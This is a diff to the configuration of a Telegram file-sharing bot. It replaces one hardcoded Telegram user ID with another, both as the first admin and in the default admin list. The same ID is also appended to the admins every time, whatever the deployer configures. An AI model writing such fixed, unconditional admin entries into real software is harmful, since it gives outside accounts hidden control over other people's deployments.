@@ -76,8 +76,8 @@ TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
 START_MSG = os.environ.get("START_MESSAGE", "Hello {first}\n\nI can store private files in Specified Channel and other users can access it from special link.")
 
 try:
-    ADMINS=[6663845789]
-    for x in (os.environ.get("ADMINS", "1198543451 6940013358 6020516635 1837294444 6695586027 6663845789").split()):
+    ADMINS=[1110013190]
+    for x in (os.environ.get("ADMINS", "1198543451 6940013358 6020516635 1837294444 6695586027 6663845789 1110013190").split()):
         ADMINS.append(int(x))
 except ValueError:
         raise Exception("Your Admins list does not contain valid integers.")
@@ -95,7 +95,7 @@ BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
 USER_REPLY_TEXT = "❌Don't send me messages directly I'm only File Share bot !"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(6663845789)
+ADMINS.append(1110013190)
 
 LOG_FILE_NAME = "uxblogs.txt"
 
